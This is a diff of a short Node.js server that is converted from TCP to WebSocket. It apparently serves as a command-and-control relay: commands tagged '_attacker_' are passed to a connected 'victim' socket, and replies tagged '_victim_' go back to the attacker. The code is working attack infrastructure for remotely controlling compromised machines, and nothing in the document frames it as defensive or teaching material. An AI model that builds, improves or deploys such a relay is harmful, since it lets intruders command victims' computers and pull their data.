@@ -1,58 +1,58 @@
-const net = require("net");
+const WebSocket = require("ws");
 
-// Server configuration
-const SERVER_PORT = 4000;
-var victimSocket;
-var attackerSocket;
+const PORT = process.env.PORT || 4000;
+let victimSocket;
+let attackerSocket;
 
-// Create a TCP server
-const server = net.createServer((socket) => {
-  // console.log(
-    // `[*] connected from ${socket.remoteAddress}:${socket.remotePort}`
-  // );
+const server = new WebSocket.Server({ port: PORT });
 
-  // Handle incoming data from the attacker
-  socket.on("data", (data) => {
-    const command = data.toString('utf8').trim();
+server.on("connection", (socket) => {
+  console.log(`[*] New connection from ${socket._socket.remoteAddress}:${socket._socket.remotePort}`);
+
+  socket.on("message", (data) => {
+    const command = data.toString().trim();
+
     if (command.startsWith("_attacker_")) {
-      console.log(`Received command from attacker: ${command}`);
+      console.log(`Received command from attacker: ${command}\n`);
       attackerSocket = socket;
       try {
         const sendMessage = data.slice(10);
-        victimSocket.write(sendMessage);        
+        victimSocket.send(sendMessage);        
       } catch (error) {
-        console.log("error: cannot send message to the victim");
+        console.log("Error: Cannot send message to the victim");
       }
     } else if (command.startsWith("_victim_")) {
       console.log(`Received message from victim: ${command}`);
       victimSocket = socket;
+
       try {
         const sendMessage = data.slice(8);
-        attackerSocket.write(sendMessage);        
+        if (attackerSocket) attackerSocket.send(sendMessage);        
       } catch (error) {
-        console.log("error: cannot send message to the attacker");
+        console.log("Error: Cannot send message to the attacker");
       }
     } else {
       console.log(`Received command from someone else: ${command}`);
     }
-
-    // Simulate sending response back to attacker
-    // socket.write("Command received and executed successfully\r\n");
   });
 
-  // Handle socket close
   socket.on("close", () => {
-    // console.log(`[*] Attacker connection closed`);
+    console.log(`[*] Connection closed`);
+    
+    if (socket === attackerSocket) {
+      console.log("[*] Attacker connection closed");
+      attackerSocket = null;
+    } else if (socket === victimSocket) {
+      console.log("[*] Victim connection closed");
+      victimSocket = null;
+    }
   });
 
-  // Handle socket error
   socket.on("error", (err) => {
     console.error(`[!] Socket error: ${err.message}`);
   });
 });
 
-const PORT = process.env.PORT || SERVER_PORT;
-// Start listening for incoming connections
-server.listen(PORT, () => {
-  console.log(`[*] Server listening on port ${PORT}`);
-});
+
+
+console.log(`[*] Server listening on port ${PORT}`);
